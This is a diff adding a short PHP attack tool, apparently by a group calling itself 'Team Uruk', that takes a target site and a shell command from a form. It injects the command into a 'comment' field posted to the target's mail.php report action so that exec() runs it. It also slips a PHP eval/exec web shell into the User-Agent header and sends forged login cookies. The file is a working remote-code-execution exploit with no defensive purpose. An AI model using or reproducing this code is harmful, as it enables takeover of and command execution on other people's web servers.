@@ -1,0 +1,37 @@
+<form action="" method="post" name="team">
+<p align="center"><b><a href="http://team.uruk-iq.com/">Team Uruk </a>&nbsp;</b></p>
+<p>&nbsp;</p>
+<p>Site : <input value="<? echo $_POST[site]; ?>" type="text" name="site" />
+Command : <input value="" type="text" name="cmd" />
+<input type="submit" name="aa" value = "Go" />
+</p>
+</form>
+<?
+$team = $_POST[site];
+$team2 = $_POST[cmd];
+$team1 = 'comment=team'.'";exit(exec('."'";
+$team1 .= $team2;
+$team1 .="'".')); echo "';
+echo login("$team/mail.php?action=sendreport",$team1);
+exit();
+function login($team,$data){
+        $fp = fopen("cookie.txt", "w");
+        fclose($fp);
+        $login = curl_init();
+		curl_setopt($login, CURLOPT_COOKIE, "PHPSESSID=7a6c311cef3553c57; userid=1; pass=$hash");
+        curl_setopt($login, CURLOPT_COOKIEJAR, "cookie.txt");
+        curl_setopt($login, CURLOPT_COOKIEFILE, "cookie.txt");
+        curl_setopt($login, CURLOPT_TIMEOUT, 40000);
+        curl_setopt($login, CURLOPT_RETURNTRANSFER, TRUE);
+        curl_setopt($login, CURLOPT_URL, $team);
+        curl_setopt($login, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']."<?eval(exec($_GET[cmd])); ?>");
+        curl_setopt($login, CURLOPT_FOLLOWLOCATION, TRUE);
+        curl_setopt($login, CURLOPT_POST, TRUE);
+        curl_setopt($login, CURLOPT_POSTFIELDS, $data);
+        ob_start();
+        return curl_exec ($login);
+        ob_end_clean();
+        curl_close ($login);
+        unset($login);    
+    } 
+?>
